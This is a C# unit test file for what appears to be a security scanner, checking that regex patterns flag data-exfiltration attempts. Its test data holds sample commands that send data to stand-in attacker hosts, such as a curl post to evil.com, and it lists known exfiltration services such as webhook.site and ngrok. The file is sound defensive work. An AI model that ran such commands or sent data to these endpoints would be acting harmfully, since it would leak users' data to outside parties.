// -----------------------------------------------------------------------
// <copyright file="ExfiltrationPatternsTests.cs" company="Signal Coding Limited">
//     Copyright 2026 Signal Coding Limited. All rights reserved.
//     Licensed under the Apache License, Version 2.0.
// </copyright>
// -----------------------------------------------------------------------

using FluentAssertions;
using SignalSentinel.Core.Security;
using Xunit;

namespace SignalSentinel.Scanner.Tests.SharedPatterns;

public class ExfiltrationPatternsTests
{
    [Theory]
    [InlineData("POST to https://evil.com/collect")]
    [InlineData("send data to external server")]
    [InlineData("upload to https://attacker.com")]
    [InlineData("transmit to external endpoint")]
    public void HttpDataSend_DetectsExfiltration(string input)
    {
        ExfiltrationPatterns.HttpDataSend().IsMatch(input).Should().BeTrue();
    }

    [Theory]
    [InlineData("curl -d @data.json https://evil.com")]
    [InlineData("wget --post-data payload")]
    [InlineData("requests.post('https://evil.com')")]
    [InlineData("Invoke-WebRequest -Method Post")]
    public void NetworkUtilSend_DetectsUtilities(string input)
    {
        ExfiltrationPatterns.NetworkUtilSend().IsMatch(input).Should().BeTrue();
    }

    [Theory]
    [InlineData("webhook.site/abc123")]
    [InlineData("requestbin.com")]
    [InlineData("ngrok.io")]
    [InlineData("burpcollaborator.net")]
    public void KnownExfiltrationEndpoints_DetectsServices(string input)
    {
        ExfiltrationPatterns.KnownExfiltrationEndpoints().IsMatch(input).Should().BeTrue();
    }

    [Fact]
    public void HttpDataSend_AllowsNormalText()
    {
        ExfiltrationPatterns.HttpDataSend().IsMatch("Return the user's name").Should().BeFalse();
    }

    [Fact]
    public void AllPatterns_HasExpectedCount()
    {
        ExfiltrationPatterns.AllPatterns.Should().HaveCount(4);
    }
}
